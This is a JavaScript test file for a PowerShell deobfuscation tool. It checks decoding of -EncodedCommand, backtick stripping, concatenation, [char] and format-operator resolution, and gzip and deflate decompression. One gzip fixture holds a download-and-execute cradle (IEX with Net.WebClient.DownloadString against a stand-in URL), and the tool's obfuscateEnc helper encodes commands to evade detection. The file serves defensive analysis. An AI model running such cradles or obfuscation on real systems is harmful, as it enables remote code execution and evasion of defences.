// PowerShell deob/obf (Fase E): capas de ofuscación + descompresión.

import { test } from 'node:test';
import assert from 'node:assert/strict';

import { psdeob } from '../src/tools/psdeob.js';

const { decodeEnc, obfuscateEnc, stripBackticks, joinConcat, charCodes, formatOperator, deobfuscate, decompressB64 } = psdeob;

test('obfuscateEnc ↔ decodeEnc: round-trip -enc (UTF-16LE)', () => {
  const b64 = obfuscateEnc('whoami');
  assert.equal(decodeEnc(b64), 'whoami');
  // formato real de PowerShell: base64 de UTF-16LE
  assert.equal(decodeEnc('SQBFAFgA'), 'IEX');
});

test('stripBackticks: convierte escapes y quita evasión', () => {
  assert.equal(stripBackticks('I`E`X'), 'IEX');
  assert.equal(stripBackticks('a`nb'), 'a\nb');
  assert.equal(stripBackticks('w`h`o`a`m`i'), 'whoami');
});

test('joinConcat: colapsa concatenaciones de literales', () => {
  assert.equal(joinConcat("'ie'+'x'"), "'iex'");
  assert.equal(joinConcat('"a" + "b" + "c"'), '"abc"');
});

test('charCodes: [char] decimal y hex', () => {
  assert.equal(charCodes('[char]105+[char]101+[char]120'), "'i'+'e'+'x'");
  assert.equal(charCodes('[char]0x69'), "'i'");
});

test('formatOperator: resuelve -f', () => {
  assert.equal(formatOperator('"{0}{1}{2}" -f \'i\',\'e\',\'x\''), '"iex"');
  assert.equal(formatOperator('"{1}{0}" -f \'x\',\'ie\''), '"iex"');
});

test('deobfuscate: backticks + concatenación a punto fijo', () => {
  const r = deobfuscate("I`E`X ('who'+'ami')");
  assert.match(r.output, /IEX \('whoami'\)/);
  assert.ok(r.layers.includes('backticks'));
  assert.ok(r.layers.includes('concatenación'));
});

test('deobfuscate: cadena [char] + concat', () => {
  const r = deobfuscate('[char]105+[char]101+[char]120');
  assert.equal(r.output, "'iex'");
  assert.ok(r.layers.includes('[char] → literal'));
});

test('deobfuscate: -EncodedCommand y blob base64 desnudo', () => {
  const enc = obfuscateEnc('Get-Process');
  assert.equal(deobfuscate('powershell -enc ' + enc).output, 'Get-Process');
  assert.ok(deobfuscate('powershell -enc ' + enc).layers.includes('-EncodedCommand → UTF-16LE'));
  // blob desnudo (sin -enc) también se detecta
  assert.equal(deobfuscate(obfuscateEnc('whoami /all')).output, 'whoami /all');
});

test('deobfuscate: texto plano queda igual, sin capas', () => {
  const r = deobfuscate('Get-ChildItem C:\\Users');
  assert.equal(r.output, 'Get-ChildItem C:\\Users');
  assert.equal(r.layers.length, 0);
});

test('decompressB64: gzip real (oráculo CompressionStream)', async () => {
  const text = 'IEX (New-Object Net.WebClient).DownloadString("http://x/y")';
  const cs = new CompressionStream('gzip');
  const w = cs.writable.getWriter(); w.write(new TextEncoder().encode(text)); w.close();
  const gz = new Uint8Array(await new Response(cs.readable).arrayBuffer());
  const b64 = Buffer.from(gz).toString('base64');
  const r = await decompressB64(b64);
  assert.equal(r.ok, true);
  assert.equal(r.format, 'gzip');
  assert.equal(r.text, text);
});

test('decompressB64: deflate-raw', async () => {
  const text = 'hola mundo deflate';
  const cs = new CompressionStream('deflate-raw');
  const w = cs.writable.getWriter(); w.write(new TextEncoder().encode(text)); w.close();
  const comp = new Uint8Array(await new Response(cs.readable).arrayBuffer());
  const r = await decompressB64(Buffer.from(comp).toString('base64'));
  assert.equal(r.ok, true);
  assert.equal(r.text, text);
});
